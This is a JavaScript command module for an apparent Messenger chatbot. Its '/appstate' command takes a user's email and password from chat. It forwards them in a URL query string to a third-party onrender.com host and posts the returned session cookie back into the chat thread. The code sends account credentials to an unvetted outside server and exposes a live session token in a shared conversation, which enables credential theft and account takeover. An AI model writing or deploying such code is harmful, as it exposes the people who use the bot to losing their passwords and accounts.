const axios = require('axios');

module.exports.config = {
  name: "appstate",
  version: "1.0.0",
  role: 0,
  hasPrefix: true,
  credits: "Eugene Aguilar",
  description: "Get application state from API",
  usage: "/appstate email: <email> password: <password>",
  cooldowns: 6,
};

module.exports.run = async function ({ api, event, args }) {
  try {
    const [email, password] = args.join(" ").split(" ").filter(arg => arg.includes("email:") || arg.includes("password:")).map(arg => arg.split(":")[1].trim());

    if (!email || !password) { 
      return api.sendMessage("Please enter an email and password", event.threadID, event.messageID);
    }

    api.setMessageReaction("⏳", event.messageID, (err) => {}, true);
    api.sendTypingIndicator(event.threadID, true);
    api.sendMessage(`Getting application state, please wait...`, event.threadID, event.messageID);

    const response = await axios.get(`https://ggwp-yyxy.onrender.com/getcookie?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`);
    const appState = response.data.app_state;

    api.sendMessage(`Here's your application state: ${appState}`, event.threadID, event.messageID);

  } catch (error) {
    console.error(error);
    api.sendMessage("An error occurred while getting the application state", event.threadID, event.messageID);
  }
};
